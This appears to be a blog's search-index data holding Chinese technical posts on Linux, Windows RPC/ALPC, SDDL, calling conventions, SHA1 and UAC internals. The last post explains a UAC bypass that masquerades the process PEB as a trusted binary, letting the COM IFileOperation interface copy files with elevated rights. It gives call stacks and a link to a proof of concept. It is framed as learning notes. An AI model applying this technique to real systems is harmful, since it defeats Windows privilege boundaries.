操作系统介绍经过对操作系统的介绍，详细大家对于计算机系统中的操作系统应该有了一定的概念。本课程重点研究的操作系统是 Linux 操作系统，现在就简单介绍一下关于 Linux 操作系统。前面实现练习操作的 Ubuntu 桌面操作系统就是一个基于 Linux 内核实现的 Linux 桌面操作系统。 Linux 系统有两种不同的含义： 一方面单指 Linus Torvalds 维护的开源代码 Unix 类操作系统的内核 Linux； 另一方面指的是以 Linux 内核为基础的整个操作系统，所以这种方式表示的 Linux 指的是包含内核、系统工具、完整的开发环境和应用的类 Unix 操作系统； Linux 现在是个人计算机和工作站上的 Unix 类操作系统。按照层次结构的观点，在同一种硬件平台上，Linux 可以提供和 Unix 相同的服务，即相同的用户级和程序员级接口。Linux 绝不是简化版的 Unix，相反，Linux 是强有力和具有创新意义的 Unix 操作系统，不仅继承了 Unix 的特征，而且在许多方面超过了 Unix 。作为 Unix 类操作系统，Linux 操作系统具有如下基本特征： 是真正的多用户、多任务操作系统 符合 POSIX 标准的操作系统 提供具有内置安全措施的分层的文件系统 提供 shell 命令解释程序和编程语言 提供强大的管理功能，包括远程管理功能 具有内核的编程接口 具有图形用户接口 具有大量有用的实用程序和通信、联网工具 具有面向屏幕的编辑软件 Linux的内核特征Linux 操作系统的核心稳定而且高效，以独占的方式执行最底层任务，保证其他程序的正常运行是整个系统的核心和独特的性质。 1、接口特色 按照 POSIX 标准，可以运行 Unix 程序的系统就是 Unix，使用 Linux 系统也属于 Unix 的一种。为此，Linux 系统提供了和一般 Unix 系统相同的标准界面，包括程序级和用户级的。 2、功能特色 Linux 核心最早运行在 Intel 80386 系统 PC 机上，如今，Linux 已经能够正常运行在 Apple、DEC alpha、MIPS、Motorola 等等一系列计算机上。同时，一些改进的嵌入式 Linux 核心也可以运行在手机、家电等设备上。Linux 系统支出多种硬件设备，并且由于 Linux 系统下的驱动程序的开发方式相比 Windows 等其他操作系统更为简单，所以越来越多的硬件厂商也针对 Linux 操作系统提供设备驱动。此外，Linux 的内存管理采用多级分页的方式；使用专用文件系统 Ext2 可以提供方便有效的文件共享及保护机制；内置 TCP&#x2F;IP 协议栈也提供了各种高效的网络功能，包括基本的进程间通信、网络文件服务等等。 Linux的版本查看Linux 内核采用的是双树系统，一棵树是稳定树，主要用于发行；另一棵树是非稳定树或者开发树，用于产品开发、改进。Linux 版本序号的形式为 x.y.z ，对于稳定树来说，y 是偶数；而对于开发树拉说，y 是相比稳定树大一的奇数。 我们可以在 Linux 操作系统的终端窗口下通过命令来获取当前操作系统的版本号，具体如下： 1uname -a 结果显示如下：","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"《Linux操作系统原理剖析》","slug":"《Linux操作系统原理剖析》","permalink":"http://example.com/tags/%E3%80%8ALinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%E3%80%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【RPC】ALPC 调用详解（翻译|TODO）","date":"2023-12-06T06:00:49.632Z","path":"A_OS/Windows/RPC/【RPC】ALPC/","text":"概述：ALPC 调用过程 学习rpc调用过程看到了csandker 的这篇文章，学习记录一下吧，供大家参考 Offensive Windows IPC Internals 3: ALPC · csandker.io 补一张作者画的图，是alpc的客户端和服务端创建及交互的过程。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"},{"name":"ALPC","slug":"ALPC","permalink":"http://example.com/tags/ALPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"}]},{"title":"【汇编】调用约定","date":"2023-12-05T16:00:00.000Z","path":"B_Code/汇编/【汇编】调用约定/","text":"概述：各种调用约定下的汇编入参方式 参考文章：自变量传递和命名约定 | Microsoft Learn __fastcall__fastcall 调用约定指定尽可能在寄存器中传递函数的自变量。 此调用约定仅适用于 x86 体系结构。 以下列表显示此调用约定的实现。 Expand table 元素 实现 参数传递顺序 在自变量列表中按从左到右的顺序找到的前两个 DWORD 或更小自变量将在 ECX 和 EDX 寄存器中传递；所有其他自变量在堆栈上从右向左传递。 堆栈维护职责 已调用函数会弹出显示堆栈中的参数。 名称修饰约定 At 符号 (@) 是名称的前缀；参数列表中的字节数（在十进制中）前面的 at 符号是名称的后缀。 大小写转换约定 不执行任何大小写转换。 类、结构和并集 被视为“多字节”类型（无论大小）并在堆栈上传递。 枚举和枚举类 如果它们的基础类型是通过寄存器传递的，则通过寄存器传递。 例如，如果基础类型是大小为 8、16 或 32 位的 int 或 unsigned int。 __thiscall特定于 Microsoft__thiscall 的调用约定用于 x86 体系结构上的 C++ 类成员函数。 它是成员函数使用的默认调用约定，该约定不使用变量参数（vararg 函数）。 在 __thiscall 下，被调用方清理堆栈，这对于 vararg 函数是不可能的。 自变量将从右到左推送到堆栈中。 指针 this 通过注册 ECX 传递，而不是在堆栈上传递。 在 ARM、ARM64 和 x64 计算机上，**__thiscall** 由编译器接受和忽略。 这是因为它们默认使用基于寄存器的调用约定。 使用 __thiscall 的原因之一是在类中成员函数默认使用 **__clrcall**。 在这种情况下，可以使用 __thiscall 确保各个成员函数可以从本机代码调用。 采用 /clr:pure 进行编译时，除非另有规定，否则所有函数和函数指针都是 **__clrcall**。 /clr:pure 和 /clr:safe 编译器选项在 Visual Studio 2015 中已弃用，并且在 Visual Studio 2017 中不受支持。 vararg 成员函数使用 __cdecl 调用约定。 所有函数参数都推送在堆栈上，**this** 指针放在最后一个堆栈上。 由于此调用约定仅适用于 C++，因此它没有 C 名称修饰方案。 在非静态类成员函数外行定义时，仅在声明中指定调用约定修饰符。 无需在行外定义上再次指定它。 编译器使用在定义点声明期间指定的调用约定。 __stdcall编译器的命令行参数是&#x2F;Gz，__stdcall是Pascal程序的缺省调用方式，大多数Windows的API也是 __stdcall 调用约定。__stdcall 函数调用约定将函数参数从右向左入栈，除非使用指针或引用类型的参数，所有参数采用传值方式传递，由被调用函数负责清除栈中的参数。对于C函数，__stdcall的名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，例如：_functionname@number","tags":[{"name":"汇编","slug":"汇编","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"【RPC】Tools","date":"2023-12-05T16:00:00.000Z","path":"A_OS/Windows/RPC/【RPC】Tools/","text":"概述：rpc学习过程中使用到的工具整理 zodiacon&#x2F;ProcMonXv2: Process Monitor X v2 tyranid&#x2F;oleviewdotnet: A .net OLE&#x2F;COM viewer and inspector to merge functionality of OleView and Test Container zodiacon&#x2F;ALPCLogger: Log ALPC activity csandker&#x2F;InterProcessCommunication-Samples: Some Code Samples for Windows based Inter-Process-Communication (IPC)","tags":[{"name":"工具整理","slug":"工具整理","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"}]},{"title":"【权限与会话】SDDL（翻译）","date":"2023-12-04T16:00:00.000Z","path":"A_OS/Windows/权限与会话/【权限与会话】SDDL/","text":"概述：本文主要翻译来自微软官方博客的文章 The Security Descriptor Definition Language of Love (Part 2) | Microsoft Learn，主要描述了 SDDL 的详细含义及结构。 相关链接： SID 字符串 - Win32 apps | Microsoft Learn ACE 字符串 ACE 字符串 - Win32 apps | Microsoft Learn Security Descriptor Definition Language for Conditional ACEs - Win32 apps | Microsoft Learn ACE 格式1AceType**;AceFlags;Rights;ObjectGuid;InheritObjectGuid;AccountSid;(ConditionalExpression)** 示例如下所示为本地系统服务的ACE的定义 // // Create a security descriptors to ACL named events: // // LocalSystem:&quot;0:SYG:SYD:(A;;GA;;;SY) &quot; // O:SYowner == local system // G:SYgroup == local system // D:no dacl flags(A; ;GA; ; ;SY) one ACE -- ACCESS_ALLOWED, GENERIC_ALL, trustee == LocalSystem #define LOCAL_SYSTEM_SD L&quot;O:SYG:SYD:(A;;GA;;;SY)&quot;","tags":[{"name":"权限与会话","slug":"权限与会话","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"DACL","slug":"DACL","permalink":"http://example.com/tags/DACL/"},{"name":"SCAL","slug":"SCAL","permalink":"http://example.com/tags/SCAL/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【OpenSource】 SHA1 in C++","date":"2023-12-04T08:24:30.290Z","path":"C_OpenSource/sha1/","text":"概述：计算 sha1 C++ 版 0x01 说明鉴于个人使用的目的，在 Github 上找了些许开源 sha1 计算的项目，最后使用 vog&#x2F;sha1 这个项目计算出来相关结果，使用比较简单，fork了一个 vs 版本记录一下。 仓库地址：holdyounger&#x2F;SHA1: sha1 implementation in C++， fork by vog&#x2F;sha1 0x02 使用如下所示，使用比较简单 计算文本 sha1 123456789101112131415161718192021222324252627282930void test_other()&#123; SHA1 checksum; cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: No string&quot; &lt;&lt; endl; compare(checksum.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); cout &lt;&lt; endl; checksum.update(&quot;&quot;); cout &lt;&lt; &quot;Test: Empty string&quot; &lt;&lt; endl; compare(checksum.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: abcde&quot; &lt;&lt; endl; checksum.update(&quot;abcde&quot;); compare(checksum.final(), &quot;03de6c570bfe24bfc328ccd7ca46b76eadaf4334&quot;); cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: Two concurrent checksum calculations&quot; &lt;&lt; endl; SHA1 checksum1, checksum2; checksum1.update(&quot;abc&quot;); compare(checksum2.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); /* &quot;&quot; */ compare(checksum1.final(), &quot;a9993e364706816aba3e25717850c26c9cd0d89d&quot;); /* &quot;abc&quot; */ cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: a [00] b [7F] c [80] d [FF] e [C3] [F0] f&quot; &lt;&lt; endl; checksum.update(std::string(&quot;a&quot; &quot;\\x00&quot; &quot;b&quot; &quot;\\x7f&quot; &quot;c&quot; &quot;\\x80&quot; &quot;d&quot; &quot;\\xff&quot; &quot;e&quot; &quot;\\xc3\\xf0&quot; &quot;f&quot;, 12)); compare(checksum.final(), &quot;cd0dd10814c0d4f9c6a2a0a4be2304d2371468d3&quot;);&#125; 计算文件 1234void test_file(const string &amp;filename)&#123; cout &lt;&lt; SHA1::from_file(filename) &lt;&lt; &quot; *&quot; &lt;&lt; filename &lt;&lt; endl;&#125; 0x03 结果校验以下是计算结果，与 Hash.exe 计算结果一直。","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"http://example.com/tags/OpenSource/"},{"name":"SHA1","slug":"SHA1","permalink":"http://example.com/tags/SHA1/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"【权限与会话】由appinfo谈谈UAC级别","date":"2023-11-30T16:00:00.000Z","path":"A_OS/Windows/权限与会话/【权限与会话】由appinfo谈谈UAC级别/","text":"概述：学习 appinfo 的时候看到了相关的设定，由此记录以及说明一下 ConsentPromptBehaviorAdmin 和 ConsentPromptBehaviorUser 两个字段。 相关阅读： 如何让Windows 10的UAC更懂你？ - 知乎 0x01 前言学习 UAC 避免不了 appinfo、consent、RPC 这三个关键点。当然，整个 UAC 的流程也不能只有这三点，还涉及到用户会话、安全策略、ACL、DACL、SACL等等概念。都是需要去了解和深入的。而安全策略我们都知道，有比较多的字段策略都是保存在注册表中的。这里就包括 &#x3D;&#x3D;用户账户控制：管理员批准模式中管理员的提升权限提示的行为&#x3D;&#x3D; .txntenvtvclk{zoom:50%;} 0x02 UAC 提权中的处理从何说起？就是UAC的提权过程中创建 consent 进程的时候。如下图所示，在 AiLaunchConstnUI 函数中，首先根据传入的 CreateFlags 来确定要检查的用户，这里分两种情况，一个管理员用户，一个普通用户。两个字段在注册表中的值所对应的策略和处理是一致的。如下所示，查询的注册表目录为 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System .ehiuoenrijjo{zoom: 80%;} 可以看到 ConsentPromptBehavior 策略值也是 UAC 提权中的一个判断点。接下来就 ConsentPromptBehavior 值描述一下。 0x03 ConsentPromptBehaviorConsentPromptBehavior 值对应了五个级别，分别如下表所示： Data: This MUST be a value in the following table. Value Meaning 0x00000000 无提示提升: 允许有权限的帐户执行需要提升权限的操作，而无需同意或凭据。注意: 仅在大多数受限制的环境中使用该选项 This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials. 0x00000001 当操作需要提升权限时，此选项会提示同意管理员输入其用户名和密码（或其他有效的管理员）。此操作在安全桌面上进行。 This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop. 0x00000002 此选项提示管理员在 “管理员审批模式 “下选择 “允许 “或 “拒绝 “需要提升权限的操作。如果同意管理员选择 “允许”，操作将以可用的最高权限继续进行。”提示同意 “消除了要求用户输入姓名和密码才能执行权限任务的不便。此操作在安全桌面上进行。 This option prompts the administrator in Admin Approval Mode to select either “Permit” or “Deny” an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. “Prompt for consent” removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop. 0x00000003 当操作需要提升权限时，该选项会提示同意管理员输入其用户名和密码（或其他有效管理员的用户名和密码）。 This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege. 0x00000004 此选项提示管理员在 “管理员审批模式 “下选择 “允许 “或 “拒绝 “需要提升权限的操作。如果同意管理员选择 “允许”，操作将以可用的最高权限继续进行。”提示同意 “消除了要求用户输入姓名和密码才能执行权限任务的不便。 This prompts the administrator in Admin Approval Mode to select either “Permit” or “Deny” an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. “Prompt for consent” removes the inconvenience of requiring that users enter their name and password to perform a privileged task. 0x00000005 该选项为默认值。它用于在管理员审批模式下提示管理员选择 “允许 “或 “拒绝 “对任何非 Windows 二进制文件进行需要提升权限的操作。如果同意管理员选择 “允许”，操作将以最高可用权限继续进行。此操作将在安全桌面上进行。 This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either “Permit” or “Deny” for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.&lt;8&gt; 其中，0x0 所代表的限制最小，0x5 是默认级别。","tags":[{"name":"权限与会话","slug":"权限与会话","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"UAC","slug":"UAC","permalink":"http://example.com/tags/UAC/"},{"name":"appinfo","slug":"appinfo","permalink":"http://example.com/tags/appinfo/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【汇编】获取进程系统信息","date":"2023-11-20T16:00:00.000Z","path":"B_Code/汇编/【汇编】获取进程系统信息/","text":"概述：汇编获取进程和系统的信息 获取进程id来源：KERNELBASE!GetCurrentProcessId 1234762a2b20 64a118000000 mov eax, dword ptr fs:[00000018h]762a2b26 8b4020 mov eax, dword ptr [eax+20h]762a2b29 c3 ret 762a2b2a cc int 3 获取TickCount来源：KERNELBASE!GetTickCount: 123456789101112131415762a1ed0 8bff mov edi, edi762a1ed2 55 push ebp762a1ed3 8bec mov ebp, esp762a1ed5 51 push ecx762a1ed6 8b0d0400fe7f mov ecx, dword ptr ds:[7FFE0004h]762a1edc 894dfc mov dword ptr [ebp-4], ecx762a1edf 81f900000001 cmp ecx, 1000000h762a1ee5 0f82bae10400 jb KERNELBASE!GetTickCount+0x4e1d5 (762f00a5)762a1eeb b82003fe7f mov eax, 7FFE0320h762a1ef0 8b00 mov eax, dword ptr [eax]762a1ef2 f7e1 mul eax, ecx762a1ef4 0facd018 shrd eax, edx, 18h762a1ef8 8be5 mov esp, ebp762a1efa 5d pop ebp762a1efb c3 ret 获取TickCount64来源：KERNELBASE!GetTickCount64 123456789101112131415161718192021222324252627282930313233343536762a2e30 8bff mov edi, edi762a2e32 55 push ebp762a2e33 8bec mov ebp, esp762a2e35 51 push ecx762a2e36 53 push ebx762a2e37 56 push esi762a2e38 57 push edi762a2e39 8b3d0400fe7f mov edi, dword ptr ds:[7FFE0004h]762a2e3f ba2403fe7f mov edx, 7FFE0324h762a2e44 897dfc mov dword ptr [ebp-4], edi762a2e47 be2003fe7f mov esi, 7FFE0320h762a2e4c bf2803fe7f mov edi, 7FFE0328h762a2e51 8b02 mov eax, dword ptr [edx]762a2e53 8b1e mov ebx, dword ptr [esi]762a2e55 8b0f mov ecx, dword ptr [edi]762a2e57 3bc1 cmp eax, ecx762a2e59 7525 jne KERNELBASE!_GetTickCount64@0+0x50 (762a2e80)762a2e5b f765fc mul eax, dword ptr [ebp-4]762a2e5e 5f pop edi762a2e5f 8bc8 mov ecx, eax762a2e61 8bf2 mov esi, edx762a2e63 8bc3 mov eax, ebx762a2e65 f765fc mul eax, dword ptr [ebp-4]762a2e68 0fa4ce08 shld esi, ecx, 8762a2e6c 0facd018 shrd eax, edx, 18h762a2e70 c1e108 shl ecx, 8762a2e73 c1ea18 shr edx, 18h762a2e76 03c1 add eax, ecx762a2e78 13d6 adc edx, esi762a2e7a 5e pop esi762a2e7b 5b pop ebx762a2e7c 8be5 mov esp, ebp762a2e7e 5d pop ebp762a2e7f c3 ret 762a2e80 f390 pause 762a2e82 ebcd jmp KERNELBASE!_GetTickCount64@0+0x21 (762a2e51)","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"【COM】通过COM组件IFileOperation越权复制文件","date":"2023-11-20T16:00:00.000Z","path":"A_OS/Windows/COM/【COM】通过COM组件IFileOperation越权复制文件/","text":"概述：本文是基于伪装PEB进行越权复制文件相关学习研究进行的拓展文章，主要记录通过COM组件越权复制文件。 [toc] 本篇博客参考的文章较多，主要描述和记录一下伪装PEB进行越权复制的操作。 伪装PEB进行越权复制伪装PEB主要操作就是修改当前进程的 ImagePathName 、 CommandLine、 FullDllName 、BaseDllName 这几个变量，通过修改成为与系统可信的进程一样的内容进而实现越权操作。3gstudent 提供了Demo，可以去Github看下相关逻辑，这里不做过多解释。 _RTL_USER_PROCESS_PARAMETERS.ImagePathName _RTL_USER_PROCESS_PARAMETERS.CommandLine(可选) _LDR_DATA_TABLE_ENTRY.FullDllName _LDR_DATA_TABLE_ENTRY.BaseDllName 源代码路径：https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp 原理：COM组件通过 &#x3D;&#x3D;Process Status API (PSAPI)&#x3D;&#x3D; 读取进程PEB结构中的Commandline来识别它们正在运行的进程。如果将进程的 Path 改成可信文件(如explorer.exe)，就能够欺骗PSAPI，调用COM组件IFileOperation实现越权复制 PSAPI：进程状态API，主要提供用于检索一下信息的函数集： 进程信息 如 EnumProcesses 模块信息 如 EnumProcessModules 设备驱动程序信息 如 EnumDeviceDrivers 进程内存使用情况信息 如 GetProcessMemoryInfo 工作集信息 如 QueryWorkingSet 内存映射文件信息 如GetMappedFileName COM调用堆栈如下所示如下所示为启动一个uac进程到该进程发起rpc的调用堆栈，须知当前进程的提权是通过 RPC 调用到 &#x3D;&#x3D;Appinfo&#x3D;&#x3D; 服务的。流程如下： uac 通过 RPC 请求到 &#x3D;&#x3D;AppInfo&#x3D;&#x3D; 服务 APPInfo 通过 AiLaunchProcess 接口创建 consent.exe 进程，调用时会传入一个结构体地址，调用命令行为 consent.exe ppid 结构体长度 结构体地址 consent.exe 会根据用户操作将结果写入结构体中。 1234567891011121314151617181920212223242526272829303132333435363738394041[0x0] RPCRT4!LRPC_BASE_CCALL::DoAsyncSend+0x21c 0xbddbc4 0x76538061 [0x1] RPCRT4!LRPC_CCALL::AsyncSend+0x61 0xbddc48 0x7653796e [0x2] RPCRT4!I_RpcSend+0x7e 0xbddc64 0x75dda34a [0x3] combase!CAsyncCall::RpcSendRequest+0xaf 0xbddc8c 0x75e59faa [0x4] combase!ThreadSendReceive+0xa4f 0xbdddd0 0x75dd77f8 [0x5] combase!CSyncClientCall::SwitchAptAndDispatchCall+0xadb 0xbdddd0 0x75dd77f8 [0x6] combase!CSyncClientCall::SendReceive2+0xbca 0xbdddd0 0x75dd77f8 [0x7] combase!SyncClientCallRetryContext::SendReceiveWithRetry+0x29 0xbddfa8 0x75e5c0a7 [0x8] combase!CSyncClientCall::SendReceiveInRetryContext+0x29 0xbddfa8 0x75e5c0a7 [0x9] combase!ClassicSTAThreadSendReceive+0x98 0xbddfa8 0x75e5c0a7 [0xa] combase!CSyncClientCall::SendReceive+0x2a7 0xbde06c 0x75de0468 [0xb] combase!CClientChannel::SendReceive+0x79 0xbde258 0x76516b23 [0xc] combase!NdrExtpProxySendReceive+0xc8 0xbde258 0x76516b23 [0xd] RPCRT4!NdrClientCall2+0x9e3 0xbde280 0x75eaeaa0 [0xe] combase!ObjectStublessClient+0x70 0xbde6d0 0x75ea6a3f [0xf] combase!ObjectStubless+0xf 0xbde6f0 0x75e113f5 [0x10] combase!CRpcResolver::DelegateActivationToSCM+0x30e 0xbde700 0x75e8c69c [0x11] combase!CRpcResolver::CreateInstance+0x14 0xbde80c 0x75e12d54 [0x12] combase!CClientContextActivator::CreateInstance+0x144 0xbde828 0x75e124d4 [0x13] combase!ActivationPropertiesIn::DelegateCreateInstance+0xc4 0xbdea88 0x75e3a762 [0x14] combase!ICoCreateInstanceEx+0xc12 0xbdead4 0x75e399d1 [0x15] combase!CComActivator::DoCreateInstance+0x231 0xbdedd8 0x75f4bec1 [0x16] combase!CComActivator::StandardCreateInstance+0x81 0xbdeecc 0x75ba8686 [0x17] ole32!CLUAMoniker::CreateInstance+0x126 0xbdf73c 0x63e8f20f [0x18] comsvcs!CNewMoniker::BindToObject+0x12f 0xbdf77c 0x75b869cd [0x19] ole32!CCompositeMoniker::BindToObject+0x19d 0xbdf7f8 0x75b84f9e [0x1a] ole32!CoGetObject+0xbe 0xbdf82c 0x74e70e88 [0x1b] windows_storage!CoCreateInstanceAsAdmin+0xb2 0xbdf878 0x74e7e364 [0x1c] windows_storage!CFileOperation::_CreateElevatedCopyengine+0x43 0xbdfb80 0x74e8293a [0x1d] windows_storage!CFileOperation::_RunElevatedOperation+0x4d 0xbdfbf4 0x74ce1761 [0x1e] windows_storage!CFileOperation::_ProcessLUAOperations+0x118056 0xbdfc28 0x74bc878a [0x1f] windows_storage!CFileOperation::PrepareAndDoOperations+0x238 0xbdfc7c 0x74bc2274 [0x20] windows_storage!CFileOperation::PerformOperations+0xd4 0xbdfcec 0xa03f55 [0x21] MasqueradePEBtoCopyfile!wmain+0x365 0xbdfd1c 0xa047fe [0x22] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0xbdfe80 0xa04667 [0x23] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0xbdfe94 0xa044fd [0x24] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0xbdfef0 0xa04878 [0x25] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0xbdfef8 0x76cdfcc9 [0x26] KERNEL32!BaseThreadInitThunk+0x19 0xbdff00 0x77607c6e [0x27] ntdll!__RtlUserThreadStart+0x2f 0xbdff10 0x77607c3e [0x28] ntdll!_RtlUserThreadStart+0x1b 0xbdff6c 0x0 CoGetObject 的创建管理员对象 到达 &#x3D;&#x3D;AppInfo&#x3D;&#x3D; 后， 调用堆栈如下所示： 1234567891011121314151617181920212223[0x0] ntdll!NtCreateUserProcess 0xdf231fc698 0x7ff9da72b473 [0x1] KERNELBASE!CreateProcessInternalW+0xfe3 0xdf231fc6a0 0x7ff9da728a03 [0x2] KERNELBASE!CreateProcessAsUserW+0x63 0xdf231fdc70 0x7ff9daa4de30 [0x3] KERNEL32!CreateProcessAsUserWStub+0x60 0xdf231fdce0 0x7ff9d4a4526b [0x4] appinfo!AiLaunchProcess+0x8eb 0xdf231fdd50 0x7ff9d4a4789d [0x5] appinfo!AiLaunchConsentUI+0x51d 0xdf231fec40 0x7ff9d4a471e3 [0x6] appinfo!AiCheckLUA+0x343 0xdf231fee60 0x7ff9d4a62ff1 [0x7] appinfo!AipGetTokenForService+0x245 0xdf231ff040 0x7ff9d4a639b6 [0x8] appinfo!RAiGetTokenForCOM+0x206 0xdf231ff160 0x7ff9db4ab4b3 [0x9] RPCRT4!Invoke+0x73 0xdf231ff220 0x7ff9db50c5ea [0xa] RPCRT4!Ndr64AsyncServerWorker+0x39a 0xdf231ff2d0 0x7ff9db489188 [0xb] RPCRT4!DispatchToStubInCNoAvrf+0x18 0xdf231ff3e0 0x7ff9db46a3a6 [0xc] RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a6 0xdf231ff430 0x7ff9db469fd6 [0xd] RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x186 0xdf231ff510 0x7ff9db47730f [0xe] RPCRT4!LRPC_SCALL::DispatchRequest+0x16f 0xdf231ff5b0 0x7ff9db4768c8 [0xf] RPCRT4!LRPC_SCALL::HandleRequest+0x7f8 0xdf231ff680 0x7ff9db475eb1 [0x10] RPCRT4!LRPC_ADDRESS::HandleRequest+0x341 0xdf231ff790 0x7ff9db47591e [0x11] RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e 0xdf231ff830 0x7ff9db47a032 [0x12] RPCRT4!LrpcIoComplete+0xc2 0xdf231ff970 0x7ff9dc990330 [0x13] ntdll!TppAlpcpExecuteCallback+0x260 0xdf231ffa10 0x7ff9dc9c2f86 [0x14] ntdll!TppWorkerThread+0x456 0xdf231ffa90 0x7ff9daa47344 [0x15] KERNEL32!BaseThreadInitThunk+0x14 0xdf231ffd90 0x7ff9dc9c26b1 [0x16] ntdll!RtlUserThreadStart+0x21 0xdf231ffdc0 0x0 越权原理基于以上描述，我们大概了解了启动一个UAC进程的流程和过程。那么，到底是在哪一步判断中进程的UAC鉴权操作。 处理逻辑：AIS(appinfo.dll) 服务：处理提升请求 主要看一下 AipGetTokenForService 函数。以下 2 种情况可能不会弹 UAC 对话框，会自动提升至管理员权限（越权也是基于白名单）： UAC 流程简单说明一下UAC的请求流程。 程序配置为自动提升 如果程序中配置了 autoElevate 为 true，会尝试自动提升 ​ 1. 先判断是否限制自动提权策略 ​ 2. 判断是否设置了 autoElevate 白名单 判断要执行的程序是否属于白名单，在白名单之内就调用 AipIsValidAutoApprovalEXE 函数检查程序签名等信息，如果不在就基本结束这个函数了 依靠上述两个判断还是不够的，在 appinfo 中还有如下所示的几个列表。 g_lpExcludedWindowsDirs .qsfvnbijgiyt{zoom:80%;} g_lpIncludedWindowsDirs .npqtrooyltyg{zoom:80%;} g_lpIncludedSystemDirs .ngkhrxlbhzve{zoom:80%;} g_lpIncludedPFDirs .etriegoirvmq{zoom:80%;} consent进程执行逻辑在进行上述判断之后会创建 consent 进程，传递父进程id以及内存地址 写入consent进程参数 .huepqjnpciov{zoom:80%;} 拉起consent进程 Buffer 就是 consent 进程的 commandline。 继续分析 consent 进程的执行逻辑。调用后，首先对命令行进行了解析。 随后读取了传入的结构体 提权操作结束后，将用户操作结果写回给 appinfo 进程直接中。 .fumeqdrjwhqv{zoom:80%;} 